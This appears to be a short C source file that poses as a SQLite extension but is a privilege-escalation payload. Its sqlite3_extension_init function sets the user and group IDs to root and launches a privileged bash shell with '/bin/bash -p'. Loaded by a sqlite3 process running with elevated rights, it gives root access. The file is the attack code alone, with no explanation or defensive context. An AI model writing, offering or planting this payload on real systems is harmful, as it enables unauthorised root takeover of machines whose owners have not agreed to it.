#include<stdlib.h>

void sqlite3_extension_init(){
				setuid(0);
				setgid(0);
				system("/bin/bash -p");
}
